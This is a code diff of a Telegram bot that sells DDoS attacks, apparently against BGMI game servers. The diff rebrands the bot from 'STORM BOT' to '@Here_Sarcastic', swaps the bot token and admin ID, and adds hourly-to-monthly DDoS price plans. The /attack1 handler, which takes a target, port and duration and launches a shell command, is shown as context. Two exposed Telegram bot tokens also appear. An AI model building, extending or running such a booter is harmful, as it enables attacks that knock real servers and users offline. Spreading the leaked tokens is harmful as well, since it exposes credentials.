@@ -8,10 +8,10 @@ import datetime
 import os
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('6985771977:AAHs45lBA9nZ93YsOjhr0LPxjsb6UMctdsg')
+bot = telebot.TeleBot('7230829849:AAFoRZgx_Nyx70PhVGiqgh2UVBniwtIKKHk')
 
 # Admin user IDs
-admin_id = ["6159360725"]
+admin_id = ["5949303408"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -97,13 +97,13 @@ def add_user(message):
                 allowed_user_ids.append(user_to_add)
                 with open(USER_FILE, "a") as file:
                     file.write(f"{user_to_add}\n")
-                response = f"User {user_to_add} Added Successfully by STORM BOT."
+                response = f"User {user_to_add} Added Successfully by Sarcastic Boy."
             else:
                 response = "User already exists."
         else:
             response = "Please specify a user ID to add."
     else:
-        response = "Only Admin Can Run This Command by STORM BOT."
+        response = "Only Admin Can Run This Command by Sarcastic Boy."
 
     bot.reply_to(message, response)
 
@@ -208,7 +208,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊1 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy STORM BOT @https://t.me/bgmisellingbuying"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊1 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy @Here_Sarcastic"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -225,7 +225,7 @@ def handle_bgmi(message):
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
-                response = "You Are On Cooldown. Please Wait 0min Before Running The /attack1 Command Again by STORM BOT @https://t.me/bgmisellingbuying."
+                response = "You Are On Cooldown. Please Wait 0min Before Running The /attack1 Command Again by @Here_Sarcastic"
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -246,7 +246,7 @@ def handle_bgmi(message):
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack1 Finished. Target: {target} Port: {port} Time: {time}"
         else:
-            response = "Usage :- /bgmi <target> <port> <time>\nBy Indian Watchdogs @Indian_Hackers_Team"  # Updated command syntax
+            response = "Usage :- /Attack1 <target> <port> <time>\nBy Indian Watchdogs @Indian_Hackers_Team"  # Updated command syntax
     else:
         response = "You Are Not Authorized To Use This Command.\nBy STORM BOT @https://t.me/bgmisellingbuying"
 
@@ -285,7 +285,7 @@ def show_help(message):
 
  To See Admin Commands:
  /admincmd : Shows All Admin Commands.
- By STORM BOT @https://t.me/bgmisellingbuying
+ By @Here_Sarcastic
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -312,24 +312,34 @@ def welcome_rules(message):
 1. Dont Run Too Many Attacks !! Cause A Ban From Bot
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
 3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
-By STORM BOT @https://t.me/bgmisellingbuying'''
+By @Here_Sarcastic'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos BY STORM BOT @https://t.me/bgmisellingbuying !!:
+    response = f'''{user_name},⛦ Brother Only Vip Ddos Is Powerfull Then Any Other Ddos !!:
 
-Vip :
+🌥Vip :
 -> Attack Time : 200 (S)
-> After Attack Limit : 2 Min
+-> After Attack Limit : 2 Min
 -> Concurrents Attack : 300
 
-Pr-ice List:
-Day-->150 Rs
-Week-->900 Rs
-Month-->1600 Rs
-By STORM BOT @https://t.me/bgmisellingbuying
+🚀 New Plans Of DDoS :- 🚀
+
+
+💥1 HR.  - ₹ 30      ( Fixed ⚡)
+💥2 HR.  - ₹ 50     ( Fixed ⚡)
+💥1 DAY - ₹ 130    ( Fixed ⚡) 
+💥2 DAY - ₹ 230   ( Fixed ⚡) 
+💥7 DAY - ₹ 630   ( Fixed ⚡) 
+💥1 MNT - ₹ 1800 ( Fixed ⚡) 
+
+💥 All PLANS HAVE 300+ SEC POWER ✅
+
+Dm  :-  @Here_Sarcastic
+
+🎀 S4 OFFICIAL 🎀
 '''
     bot.reply_to(message, response)
 
